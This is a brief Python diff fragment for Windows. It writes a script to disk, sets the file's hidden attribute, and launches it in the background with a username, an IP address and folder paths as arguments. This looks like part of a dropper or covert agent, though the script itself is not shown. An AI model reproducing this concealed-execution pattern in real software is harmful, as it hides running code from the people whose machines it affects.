@@ -3,7 +3,7 @@ import ctypes
 import os
 
 
-def main(path):
+def main(username, path, current_folder, ip):
     if not os.path.isfile(path) and not os.path.isdir(path):
         raise FileNotFoundError(f"The file '{path}' does not exist.")
     
@@ -21,5 +21,4 @@ def main(path):
         file.write(script)
 
     ret = ctypes.windll.kernel32.SetFileAttributesW(filepath, 0x02)
-
-    subprocess.Popen(["python", file_to_copy, path], cwd=parent_dir)
+    subprocess.Popen(["python", file_to_copy, username, ip, path, current_folder], cwd=parent_dir)
